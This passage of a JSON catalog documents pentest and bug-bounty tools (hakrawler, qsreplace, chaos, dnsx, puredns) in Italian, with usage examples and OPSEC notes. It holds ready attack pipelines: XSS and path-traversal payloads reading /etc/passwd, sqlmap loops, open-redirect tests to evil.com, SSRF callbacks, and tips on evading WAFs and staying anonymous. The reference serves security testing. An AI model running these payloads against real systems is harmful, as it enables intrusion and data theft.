comuni e remunerative. DalFox permette di testare migliaia di URL in batch, trovando injection points che scanner generici mancano.</li><li><strong>Penetration Testing web:</strong> Verifica sistematica di tutti i parametri user-controllati per reflection XSS. Il report dettagliato include PoC copiabili per il deliverable.</li><li><strong>Stored XSS assessment:</strong> La modalità SXSS automatizza il test di form che persistono input e lo rendono visibile ad altri utenti (commenti, profili, messaggi).</li><li><strong>DOM XSS research:</strong> L'integrazione headless browser è essenziale per SPA moderne dove la reflection avviene client-side tramite JavaScript.</li><li><strong>CI/CD security gate:</strong> Integrato in pipeline per regression testing, assicura che fix XSS non vengano reintrodotti in release successive.</li><li><strong>WAF testing:</strong> Utile per security team che vogliono verificare l'efficacia delle regole WAF contro XSS payload evoluti.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento WAF:</strong> I payload XSS (tag script, event handlers, javascript: URI) sono pattern ben noti ai WAF. Aspettarsi blocchi frequenti senza evasion.</li><li><strong>Rate limiting:</strong> Molti parametri per pagina generano molte richieste. Configurare <code>-w</code> e <code>--delay</code> per evitare blocchi.</li><li><strong>Log analysis:</strong> Ogni payload testato è loggato server-side. Pattern come <code>&lt;script&gt;</code> nei log sono red flag evidenti.</li><li><strong>Headless detection:</strong> Siti con bot detection (Cloudflare, PerimeterX) possono identificare e bloccare il browser headless.</li><li><strong>Blind XSS exposure:</strong> Il callback server espone il tuo IP. Usare server terzi o VPN per anonimato.</li></ul><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "hakrawler",
    "name": "hakrawler",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/hakluke/hakrawler",
    "desc": "Web crawler veloce in Go per scoprire URL e file JavaScript durante la reconnaissance.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hakrawler</strong> è un web crawler minimalista ma potente, costruito in Go utilizzando la libreria Colly, ottimizzato per la fase di reconnaissance di security assessments. A differenza di crawler general-purpose come Burp Spider, Hakrawler è progettato specificamente per le esigenze dei penetration tester: estrae rapidamente tutti i link, form, endpoint e file JavaScript da un'applicazione web, producendo output pulito ready per pipeline con altri tool.</p><p>La sua forza sta nella semplicità e velocità: accetta URL da stdin, crawla con parallelismo configurabile, e produce output su stdout che può essere direttamente pipelined a tool di vulnerability scanning. Il supporto per scope control (subdomain, same-domain, all) e depth limiting permette di calibrare precisamente l'ampiezza della scansione in base al target e al tempo disponibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Concurrent Crawling:</strong> Parallelismo configurabile (default 8 thread) per bilanciare velocità e carico sul target. Ogni thread mantiene la propria sessione HTTP con connection pooling.</p><p><strong>Scope Control Granulare:</strong> <code>-subs</code> include subdomain nel crawl (es. da target.com crawla anche api.target.com), <code>-depth</code> limita la profondità di link follow, utile per site con strutture profonde o infinite loop detection.</p><p><strong>Output Customization:</strong> Output plain text (un URL per riga) per pipeline Unix, oppure JSON strutturato con metadata (source page, tag type, attribute). L'opzione <code>-u</code> deduplica l'output on-the-fly.</p><p><strong>JavaScript Discovery:</strong> Estrae tutti i riferimenti a file .js, fondamentale per successiva analisi con tool come LinkFinder o JSParser che cercano endpoint e secrets hardcoded nel codice.</p><p><strong>Form &amp; Endpoint Extraction:</strong> Identifica form HTML con relativi action URL e metodi, e parametri query string che possono essere target di injection testing.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === CRAWLING BASE ===\n# Crawl singolo target - estrai tutti i link\necho \"https://target.com\" | hakrawler\n\n# Include subdomain nel scope (segue link a *.target.com)\necho \"https://target.com\" | hakrawler -subs\n\n# Limita profondità per siti enormi\necho \"https://target.com\" | hakrawler -depth 3\n\n# === PIPELINE RECON ===\n# Workflow completo: subdomain -&gt; probe -&gt; crawl -&gt; dedup\nsubfinder -d target.com -silent | httpx -silent | hakrawler -subs -u | tee all_urls.txt\n\n# Estrai solo file JavaScript per analisi secrets\necho \"https://target.com\" | hakrawler -subs | grep \"\\.js$\" | sort -u &gt; js_files.txt\ncat js_files.txt | xargs -I {} bash -c 'curl -s {} | grep -oE \"[a-zA-Z0-9_]+=[a-zA-Z0-9]+\"'\n\n# === SCANSIONE MASSIVA ===\n# Crawl lista di subdomain con output JSON\ncat live_hosts.txt | hakrawler -subs -depth 2 -json &gt; crawl_results.json\n\n# Pipeline verso nuclei per vulnerability scan\ncat live_hosts.txt | hakrawler -subs -u | nuclei -t exposures/ -t cves/ -o vulns.txt\n\n# === CONFIGURAZIONI AVANZATE ===\n# Con autenticazione via cookie\necho \"https://target.com\" | hakrawler -h \"Cookie: session=abc123; token=xyz\"\n\n# Attraverso proxy per logging in Burp\necho \"https://target.com\" | hakrawler -proxy http://127.0.0.1:8080\n\n# User-Agent custom per evitare blocchi\necho \"https://target.com\" | hakrawler -h \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n\n# === ESTRAZIONE PARAMETRI ===\n# Trova URL con parametri per injection testing\necho \"https://target.com\" | hakrawler -subs | grep \"?\" | grep \"=\" | sort -u &gt; urls_with_params.txt\n\n# Pipeline diretta a dalfox per XSS scan\necho \"https://target.com\" | hakrawler -subs | grep \"=\" | dalfox pipe -o xss_results.txt\n\n# === OUTPUT STRUTTURATO ===\n# JSON per parsing programmatico\necho \"https://target.com\" | hakrawler -json | jq '.url' -r | sort -u</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Attack Surface Mapping:</strong> Prima fase di ogni web pentest - mappa tutti gli endpoint raggiungibili dall'applicazione target prima di procedere con testing specifico.</li><li><strong>JavaScript Analysis Setup:</strong> Estrae tutti i file .js per successiva analisi con LinkFinder, JSParser o grep manuali alla ricerca di API keys, endpoint interni, secrets hardcoded.</li><li><strong>Bug Bounty recon:</strong> Parte essenziale della recon pipeline insieme a subfinder, httpx, gau. Trova pagine e parametri che non appaiono in archivi storici.</li><li><strong>Form Discovery:</strong> Identifica form di login, registrazione, contatto, upload che sono target primari per testing di autenticazione, CSRF, injection.</li><li><strong>Scope Verification:</strong> Per programmi bug bounty con scope definiti, verifica quali endpoint sono effettivamente raggiungibili e in-scope.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Traffic Volume:</strong> Il crawling genera molte richieste HTTP. Senza rate limiting, può apparire come DDoS o attivare protezioni automatiche.</li><li><strong>Log Footprint:</strong> Ogni URL visitata è loggata server-side. Il pattern di accesso sequenziale a tutti gli endpoint è riconoscibile.</li><li><strong>WAF Detection:</strong> User-Agent default e pattern di crawling possono triggerare blocchi WAF. Usare <code>-h</code> per header custom.</li><li><strong>Infinite Loops:</strong> Siti con URL dinamiche (session ID, timestamp) possono causare crawl infiniti. Usare <code>-depth</code> per limitare.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
    "id": "qsreplace",
    "name": "qsreplace",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/tomnomnom/qsreplace",
    "desc": "Utility per sostituire i valori dei query string parameter negli URL con un valore custom.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Qsreplace</strong> è una utility Unix-style essenziale nel toolkit di ogni bug bounty hunter e penetration tester, creata da tomnomnom. La sua funzione è semplice ma fondamentale: prende URL da stdin e sostituisce tutti i valori dei query string parameter con un valore specificato, producendo output su stdout. Questa operazione apparentemente banale è il collante che permette di connettere tool di reconnaissance (gau, waybackurls, hakrawler) con tool di vulnerability testing (nuclei, dalfox, sqlmap).</p><p>Il tool implementa anche deduplicazione intelligente: URL con la stessa combinazione host+path+parametri vengono emesse una sola volta, anche se i valori originali erano diversi. Questo riduce drasticamente il numero di test necessari quando si lavora con archivi storici che contengono migliaia di varianti della stessa URL. La modalità append permette di aggiungere payload ai valori esistenti invece di sostituirli, utile per injection che richiedono un prefisso valido.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Value Replacement:</strong> Sostituisce il valore di ogni parametro query string con la stringa specificata. Input: <code>site.com/page?id=123&amp;name=test</code> → Output: <code>site.com/page?id=PAYLOAD&amp;name=PAYLOAD</code></p><p><strong>Append Mode:</strong> Con <code>-a</code>, appende il payload al valore esistente invece di sostituirlo. Utile per SQL injection dove il valore originale deve essere preservato: <code>id=123</code> → <code>id=123'</code></p><p><strong>Smart Deduplication:</strong> Elimina automaticamente URL duplicate basandosi su host+path+set di parametri, non sui valori. Evita di testare la stessa injection point migliaia di volte.</p><p><strong>Unix Philosophy:</strong> Fa una cosa sola e la fa bene. Stdin/stdout per composizione con altri tool tramite pipe.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === OPERAZIONI BASE ===\n# Sostituisci tutti i valori con marker FUZZ\ncat urls.txt | qsreplace 'FUZZ'\n# Input:  https://target.com/search?q=test&amp;page=1\n# Output: https://target.com/search?q=FUZZ&amp;page=FUZZ\n\n# Append invece di sostituire (per SQLi)\ncat urls.txt | qsreplace -a \"'\"\n# Input:  https://target.com/user?id=123\n# Output: https://target.com/user?id=123'\n\n# === PIPELINE VULNERABILITY TESTING ===\n# XSS testing: gau -&gt; dedup -&gt; replace -&gt; dalfox\ngau target.com | grep \"=\" | qsreplace '\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;' | \\\n  dalfox pipe --silence --only-poc -o xss_vulns.txt\n\n# SQLi testing: prepara URL per sqlmap batch\ncat urls.txt | qsreplace 'FUZZ' | sort -u &gt; sqlmap_targets.txt\nwhile read url; do\n  sqlmap -u \"$url\" --batch --dbs --random-agent\ndone &lt; sqlmap_targets.txt\n\n# SSRF testing con collaborator/webhook\ngau target.com | grep \"=\" | qsreplace 'https://webhook.site/YOUR-ID' | \\\n  xargs -P 20 -I {} curl -sk {} &amp;&gt;/dev/null\n\n# === WORKFLOW COMPLETI ===\n# Recon completa -&gt; parameter testing\nsubfinder -d target.com -silent | httpx -silent | \\\n  katana -silent | grep \"=\" | uro | qsreplace 'FUZZ' | \\\n  nuclei -t fuzzing/ -o fuzz_results.txt\n\n# LFI testing massivo\ncat urls.txt | qsreplace '../../../etc/passwd' | \\\n  xargs -P 10 -I {} sh -c 'curl -sk \"{}\" | grep -q \"root:\" &amp;&amp; echo \"[VULN] {}\"'\n\n# Open redirect testing\ngau target.com | grep -E \"(url|redirect|next|return|goto)=\" | \\\n  qsreplace 'https://evil.com' | xargs -P 10 -I {} curl -skIL {} | \\\n  grep -i \"location.*evil.com\"\n\n# === COMBINAZIONE CON ALTRI TOOL ===\n# Prepara URL per ffuf parameter fuzzing\ncat urls.txt | qsreplace 'FUZZ' | head -1 &gt; fuzz_template.txt\nffuf -w wordlist.txt -u \"$(cat fuzz_template.txt)\" -mc 200,302\n\n# Nuclei fuzzing templates\ncat urls.txt | qsreplace 'FUZZ' | nuclei -t fuzzing/ -fuzz -o results.txt\n\n# === DEDUPLICAZIONE ===\n# Mostra effetto deduplicazione\necho -e \"site.com/a?id=1\\nsite.com/a?id=2\\nsite.com/a?id=3\" | qsreplace 'X'\n# Output: site.com/a?id=X (solo una volta!)\n\n# Combina con uro per max deduplicazione\ngau target.com | uro | qsreplace 'FUZZ' | wc -l  # molto meno URL</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Injection Point Preparation:</strong> Trasforma URL storiche da gau/waybackurls in target pronti per injection testing. Il marker FUZZ indica dove inserire payload.</li><li><strong>Mass Vulnerability Testing:</strong> Permette di testare centinaia di endpoint rapidamente con payload statici (XSS probe, SQLi quote, path traversal).</li><li><strong>Fuzzing Setup:</strong> Prepara URL template per tool come ffuf o nuclei fuzzing mode che richiedono placeholder espliciti.</li><li><strong>SSRF/Open Redirect Discovery:</strong> Sostituisce parametri URL-like con callback server per identificare vulnerabilità di redirect e SSRF.</li><li><strong>Deduplication Layer:</strong> Riduce drammaticamente il numero di test eliminando URL che differiscono solo per valore dei parametri.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Tool Locale:</strong> Qsreplace stesso non genera traffico di rete - opera esclusivamente su stdin/stdout.</li><li><strong>Downstream Traffic:</strong> I payload inseriti causano traffico quando le URL generate vengono effettivamente testate. I payload malevoli nei log sono tracciabili.</li><li><strong>Encoding:</strong> Non esegue URL encoding automatico. Payload con caratteri speciali potrebbero richiedere encoding manuale prima dell'uso.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "Utilities"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-chaos",
    "name": "chaos",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/chaos-client",
    "desc": "Client CLI per Chaos Dataset API di ProjectDiscovery per subdomain enumeration passiva.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Chaos</strong> Client è il client CLI ufficiale per accedere al Chaos Dataset di ProjectDiscovery, uno dei più grandi database pubblici di subdomain al mondo. Il dataset viene popolato continuamente da scansioni automatizzate dell'infrastruttura ProjectDiscovery e contiene centinaia di milioni di subdomain raccolti passivamente da programmi bug bounty, Fortune 500 e domini popolari. A differenza di tool attivi come subfinder, Chaos non genera alcun traffico verso il target: le query vengono eseguite esclusivamente contro l'API ProjectDiscovery.</p><p>Questo approccio completamente passivo è invaluable in scenari dove la stealth è critica o come primo step di reconnaissance per avere immediatamente una baseline di subdomain noti prima di procedere con enumerazione attiva. Il dataset copre oltre 40 milioni di programmi bug bounty e viene aggiornato quotidianamente. L'accesso richiede una API key gratuita ottenibile registrandosi su cloud.projectdiscovery.io.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Massive Dataset Access:</strong> Accesso a centinaia di milioni di subdomain pre-raccolti. Per domini popolari, il dataset può contenere migliaia di subdomain che richiederebbero giorni di brute-force per essere scoperti attivamente.</p><p><strong>Zero Target Interaction:</strong> Tutte le query sono verso l'API Chaos. Il target non riceve alcun traffico, rendendo l'operazione completamente invisibile.</p><p><strong>Statistics &amp; Analytics:</strong> Il comando <code>-stats</code> mostra metriche sul dataset: numero totale di domini tracciati, subdomain per dominio, data ultimo aggiornamento.</p><p><strong>Batch Processing:</strong> Elabora liste di domini in batch, ideale per valutare l'attack surface di organizzazioni con molti asset.</p><p><strong>Integration Ready:</strong> Output plain text o JSON per facile integrazione con altri tool dell'ecosistema ProjectDiscovery (httpx, nuclei, subfinder).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP INIZIALE ===\n# Configura API key (ottenere da cloud.projectdiscovery.io)\nexport PDCP_API_KEY=\"your-api-key-here\"\n# Oppure salva in ~/.config/pdcp/config.yaml\n\n# === QUERY BASE ===\n# Subdomain per singolo dominio\nchaos -d target.com\n\n# Con output su file\nchaos -d target.com -o target_subdomains.txt\n\n# Output JSON per parsing\nchaos -d target.com -json | jq '.subdomains[]' -r\n\n# === BATCH PROCESSING ===\n# Query multipli domini (bug bounty multi-scope)\ncat scope_domains.txt | chaos -o all_subdomains.txt\n\n# Con file input esplicito\nchaos -dL domains.txt -o batch_results.txt\n\n# === STATISTICHE ===\n# Visualizza statistiche dataset\nchaos -d target.com -count\n# Output: target.com has 1,234 subdomains\n\n# Lista programmi bug bounty indicizzati\nchaos -ls\n\n# === PIPELINE RECON ===\n# Workflow passivo completo: chaos -&gt; httpx -&gt; nuclei\nchaos -d target.com -silent | httpx -silent | \\\n  nuclei -t exposures/ -t cves/ -severity high,critical -o vulns.txt\n\n# Combina con subfinder per max coverage\n(chaos -d target.com -silent; subfinder -d target.com -silent) | \\\n  sort -u | httpx -silent &gt; live_hosts.txt\n\n# === CONFRONTO PRE/POST ===\n# Salva baseline iniziale\nchaos -d target.com -o baseline_$(date +%Y%m%d).txt\n\n# Dopo N giorni, confronta per nuovi subdomain\nchaos -d target.com -o current.txt\ncomm -23 &lt;(sort current.txt) &lt;(sort baseline_*.txt) &gt; new_subdomains.txt\n\n# === OUTPUT FORMATTATO ===\n# Solo hostname senza protocollo\nchaos -d target.com -silent | sed 's/^/https:\\/\\//' | httpx -silent\n\n# Filtra per pattern (es. staging, dev)\nchaos -d target.com -silent | grep -E \"(stag|dev|test|uat)\"\n\n# === VERIFICA COVERAGE ===\n# Controlla se un dominio è nel dataset\nchaos -d smallcompany.com -count\n# Se 0, il dominio non è tracciato - usa solo tool attivi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Stealth Reconnaissance:</strong> Prima fase di recon in engagement dove ogni pacchetto verso il target deve essere giustificato. Zero footprint sul target.</li><li><strong>Bug Bounty Quick Start:</strong> Prima di investire tempo in enumerazione attiva, controlla cosa è già noto. Spesso il dataset Chaos contiene già centinaia di subdomain per programmi popolari.</li><li><strong>Attack Surface Baseline:</strong> Stabilisce una baseline di asset noti per confronto futuro. Utile per monitorare l'espansione dell'infrastruttura di un target.</li><li><strong>Scope Validation:</strong> Verifica rapidamente quali asset di un'organizzazione sono pubblicamente noti e potrebbero essere in-scope per un engagement.</li><li><strong>Red Team Preparation:</strong> Raccoglie intelligence passiva prima di engagement attivi, riducendo il rumore iniziale.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Zero Target Footprint:</strong> Completamente passivo verso il target. Nessun pacchetto, nessun log, nessun alert.</li><li><strong>API Provider Visibility:</strong> ProjectDiscovery vede le query. Per engagement sensibili, considerare che le query potrebbero essere loggate.</li><li><strong>Dataset Freshness:</strong> I dati potrebbero non essere aggiornati al minuto. Subdomain molto recenti potrebbero non essere ancora indicizzati.</li><li><strong>Coverage Variabile:</strong> Domini piccoli o nuovi potrebbero non essere nel dataset. Sempre combinare con enumerazione attiva per completezza.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-dnsx",
    "name": "dnsx",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/dnsx",
    "desc": "Toolkit DNS multi-purpose per risoluzione, brute-force e validazione con supporto wildcard detection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>dnsx</strong> è il toolkit DNS definitivo di ProjectDiscovery, costruito sulla libreria retryabledns per massima affidabilità e performance. Progettato per operazioni di reconnaissance su larga scala, combina risoluzione DNS veloce con funzionalità avanzate come wildcard filtering, multi-query support per tutti i record type, e brute-force con wordlist. È il tool di riferimento per validare e arricchire liste di subdomain generate da altri tool.</p><p>La sua architettura supporta resolver multipli (UDP, TCP, DoH, DoT) con automatic retry e failover, garantendo risultati affidabili anche con liste di milioni di hostname. Il wildcard detection multi-livello elimina automaticamente i falsi positivi che affliggono altri resolver, mentre l'output strutturato permette estrazione di IP, CNAME, nameserver e altri record per analisi successive. È il ponte tra subdomain enumeration e port scanning.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Record Type Support:</strong> Query per A, AAAA, CNAME, NS, MX, TXT, SRV, SOA, PTR, CAA, AXFR, ANY e modalità recon che estrae tutti i tipi in una volta sola.</p><p><strong>Wildcard Detection Avanzato:</strong> Sistema multi-livello che identifica e filtra DNS wildcard (domini che rispondono a qualsiasi query) prevenendo migliaia di falsi positivi nelle enumerazioni.</p><p><strong>Brute-Force Integrato:</strong> Supporto nativo per subdomain brute-forcing con wordlist, incluso placeholder FUZZ per pattern matching dinamico come <code>FUZZ.target.com</code>.</p><p><strong>Resolver Flexibility:</strong> Usa resolver di sistema, lista custom, o specifici protocolli (DNS-over-HTTPS con Cloudflare/Google, DNS-over-TLS). Automatic retry con backoff e failover tra resolver.</p><p><strong>Rich Output:</strong> Oltre al semplice hostname, può emettere response code, TTL, IP address, CNAME target, e raw response per analisi dettagliata.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === RISOLUZIONE BASE ===\n# Risolvi singolo hostname\necho \"api.target.com\" | dnsx\n\n# Risolvi lista di subdomain (output: hostname che risolvono)\ncat subdomains.txt | dnsx -silent -o resolved.txt\n\n# Con response IP incluso\ncat subdomains.txt | dnsx -a -resp\n# Output: api.target.com [1.2.3.4]\n\n# === RECORD TYPE SPECIFICI ===\n# Estrai CNAME per identificare CDN/terze parti\ncat subdomains.txt | dnsx -cname -resp\n# Output: cdn.target.com [d111111abcdef8.cloudfront.net]\n\n# Estrai MX per mail server\necho \"target.com\" | dnsx -mx -resp\n\n# Estrai TXT per SPF, DKIM, verifications\necho \"target.com\" | dnsx -txt -resp\n\n# Recon mode: tutti i record types\necho \"target.com\" | dnsx -recon -resp-only\n\n# === SUBDOMAIN BRUTE-FORCE ===\n# Brute-force con wordlist\ndnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# Con pattern FUZZ per nomenclature specifiche\ndnsx -d target.com -w words.txt -wp \"FUZZ-api.FUZZ\"\n# Testa: dev-api.dev, staging-api.staging, etc.\n\n# === WILDCARD HANDLING ===\n# Abilita wildcard filtering esplicito\ncat subdomains.txt | dnsx -wd target.com\n\n# Test se dominio ha wildcard\necho \"randomnonexistent12345.target.com\" | dnsx -a -resp\n# Se risolve, wildcard è attivo\n\n# === RESOLVER AVANZATI ===\n# Usa resolver custom (file con IP:porta)\ncat subdomains.txt | dnsx -r resolvers.txt -a -resp\n\n# DNS-over-HTTPS (Cloudflare)\ncat subdomains.txt | dnsx -doh-url https://cloudflare-dns.com/dns-query\n\n# Con retry e timeout custom\ncat subdomains.txt | dnsx -retry 3 -t 5 -a -resp\n\n# === PIPELINE RECON ===\n# Workflow completo: subfinder -&gt; dnsx validate -&gt; extract IPs -&gt; nmap\nsubfinder -d target.com -silent | dnsx -a -resp-only | \\\n  sort -u | tee ips.txt | nmap -iL - -sV -oN scan.txt\n\n# Validazione + probe HTTP\ncat all_subdomains.txt | dnsx -silent | httpx -silent | nuclei -t cves/\n\n# Estrai provider (CDN, Cloud) da CNAME\ncat subdomains.txt | dnsx -cname -resp | grep -E \"(cloudfront|akamai|fastly|azure|aws)\"\n\n# === REVERSE DNS ===\n# PTR lookup per range IP\necho \"1.2.3.4\" | dnsx -ptr -resp\n\n# Da CIDR a hostname\nprips 192.168.1.0/24 | dnsx -ptr -resp-only | grep target.com\n\n# === OUTPUT FORMATTATO ===\n# JSON per parsing programmatico\ncat subdomains.txt | dnsx -a -resp -json -o results.json\n\n# Solo IP (per nmap input)\ncat subdomains.txt | dnsx -a -resp-only -silent &gt; ips.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Subdomain Validation:</strong> Dopo enumeration con subfinder/amass, valida quali hostname risolvono effettivamente. Elimina subdomain morti prima di scanning HTTP.</li><li><strong>IP Extraction:</strong> Estrae gli indirizzi IP per costruire target list per port scanning con nmap/masscan. Identifica se più subdomain puntano allo stesso IP (virtual hosting).</li><li><strong>Infrastructure Mapping:</strong> CNAME resolution rivela dipendenze da CDN (CloudFront, Akamai), cloud provider (AWS, Azure, GCP), e servizi terzi potenzialmente vulnerabili a takeover.</li><li><strong>Brute-Force Enumeration:</strong> Alternativa a massdns/shuffledns quando serve integrazione stretta con workflow ProjectDiscovery.</li><li><strong>Reverse DNS Recon:</strong> Da IP noti (es. da certificate transparency) trova hostname associati che potrebbero essere fuori scope apparente ma collegati al target.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>DNS Query Logging:</strong> Le query DNS sono visibili ai resolver utilizzati. ISP e corporate DNS loggano le richieste.</li><li><strong>Resolver Choice:</strong> Per anonimato, usare resolver pubblici (8.8.8.8, 1.1.1.1) invece del DNS aziendale. Per stealth totale, usare DoH/DoT.</li><li><strong>Traffic Volume:</strong> Brute-force genera migliaia di query. Rate limiting e distribuzione tra resolver prevengono blocchi.</li><li><strong>Authoritative NS Detection:</strong> I nameserver autoritativi del target vedono tutte le query. Considerare se questo traffico è accettabile nell'engagement.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "puredns",
    "name": "puredns",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/d3mondev/puredns",
    "desc": "Tool per DNS resolution e subdomain brute-force veloce con filtering wildcard e validazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Puredns</strong> è il tool di riferimento per subdomain enumeration su larga scala, combinando la velocità raw di massdns con un layer di intelligence che elimina i falsi positivi che affliggono altri resolver. Il suo algoritmo proprietario di wildcard detection e la validazione multi-fase producono risultati puliti e affidabili anche su domini con configurazioni DNS complesse o abusate da wildcard.</p><p>L'architettura opera in tre fasi distinte: prima esegue mass resolution tramite massdns con resolver pubblici distribuiti geograficamente, poi applica wildcard filtering che analizza pattern di risposta per identificare e rimuovere falsi positivi, infine valida i risultati con resolver trusted (Google DNS 8.8.8.8) per eliminare eventuali DNS poisoning o risposte corrotte. Questo approccio a tre livelli garantisce che ogni subdomain nell'output finale sia realmente esistente e raggiungibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dual Operation Mode:</strong> <code>bruteforce</code> per generare e testare subdomain da wordlist, <code>resolve</code> per validare liste pre-esistenti da altri tool. Entrambi beneficiano dello stesso filtering avanzato.</p><p><strong>Wildcard Detection Multi-Level:</strong> Algoritmo che identifica wildcard DNS non solo al livello base (*.domain.com) ma anche a livelli multipli (*.sub.domain.com), un problema che causa milioni di falsi positivi in altri tool.</p><p><strong>Trusted Validation:</strong> Fase finale che ri-testa tutti i risultati positivi con Google DNS, eliminando risposte fraudolente da resolver compromessi o con cache poisoning.</p><p><strong>Massdns Integration:</strong> Sfrutta massdns come engine per query massivamente parallele (100k+ query/secondo su hardware adeguato), ma aggiunge l'intelligence mancante.</p><p><strong>Resolver Management:</strong> Testa automaticamente i resolver per affidabilità e rimuove quelli che producono risposte inconsistenti o lente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === PREREQUISITI ===\n# Puredns richiede massdns installato\n# Su Kali: apt install massdns\n# Serve anche una lista di resolver pubblici affidabili\n\n# === SUBDOMAIN BRUTE-FORCE ===\n# Brute-force base con wordlist\npuredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt target.com\n\n# Con resolver custom e output file\npuredns bruteforce wordlist.txt target.com -r resolvers.txt -w found.txt\n\n# Wordlist massiva con rate limiting (evita blocchi resolver)\npuredns bruteforce subdomains-top1million-110000.txt target.com \\\n  -r resolvers.txt -l 5000 --wildcard-batch 1000000\n\n# === RESOLVE MODE ===\n# Valida lista da subfinder/amass\nsubfinder -d target.com -silent | puredns resolve -w valid.txt\n\n# Resolve con output dettagliato\npuredns resolve subdomains.txt -r resolvers.txt -w resolved.txt --write-wildcards wildcards.txt\n\n# === WILDCARD HANDLING ===\n# Mostra wildcard trovati (per debug)\npuredns bruteforce wordlist.txt target.com -r resolvers.txt --print-wildcards\n\n# Salta wildcard detection (se sei sicuro non ci siano)\npuredns resolve subdomains.txt --skip-wildcard-filter\n\n# === PIPELINE RECON ===\n# Workflow completo: passivo -&gt; brute -&gt; merge -&gt; probe\nsubfinder -d target.com -silent &gt; passive.txt\npuredns bruteforce wordlist.txt target.com -r resolvers.txt -w bruteforce.txt\ncat passive.txt bruteforce.txt | sort -u | puredns resolve -w final.txt\ncat final.txt | httpx -silent | nuclei -t cves/ -o vulns.txt\n\n# Massivo multi-dominio\ncat scope_domains.txt | while read domain; do\n  echo \"[*] Bruteforcing $domain\"\n  puredns bruteforce wordlist.txt \"$domain\" -r resolvers.txt -w \"${domain}_subs.txt\" -q\ndone\n\n# === OTTIMIZZAZIONE PERFORMANCE ===\n# Alta velocità con molti resolver\npuredns bruteforce wordlist.txt target.com -r 1000_resolvers.txt \\\n  --bin $(which massdns) -l 10000\n\n# Bilanciamento accuratezza/velocità\npuredns bruteforce wordlist.txt target.com \\\n  --wildcard-tests 10 --wildcard-batch 500000\n\n# === INTEGRAZIONE ALTERX ===\n# Genera permutazioni -&gt; resolve con puredns\necho \"api.target.com\" | alterx -enrich | puredns resolve -w permuted_valid.txt\n\n# === OUTPUT ANALYSIS ===\n# Estrai statistiche\nwc -l found.txt\ncat found.txt | rev | cut -d. -f1-2 | rev | sort | uniq -c | sort -rn  # TLD distribution</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Large-Scale Enumeration:</strong> Brute-force con wordlist da milioni di entry su organizzazioni enterprise. Il wildcard filtering previene output inquinato da falsi positivi.</li><li><strong>Result Validation:</strong> Dopo enumeration passiva con subfinder/amass, valida che i subdomain trovati siano effettivamente live e non stale data.</li><li><strong>Bug Bounty Automation:</strong> Integrato in pipeline automatizzate per scansione continua di scope, identifica rapidamente nuovi subdomain man mano che vengono deployati.</li><li><strong>Resolver Quality Check:</strong> L'analisi automatica dei resolver identifica quelli problematici, utile per costruire liste di resolver affidabili.</li><li><strong>Baseline Establishment:</strong> Crea snapshot completi dell'infrastruttura DNS per confronto futuro e change detection.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>DNS Traffic Volume:</strong> Il brute-force genera un volume enorme di query DNS. I nameserver autoritativi del target vedono ogni singola query.</li><li><strong>Resolver Logging:</strong> I resolver pubblici utilizzati loggano le 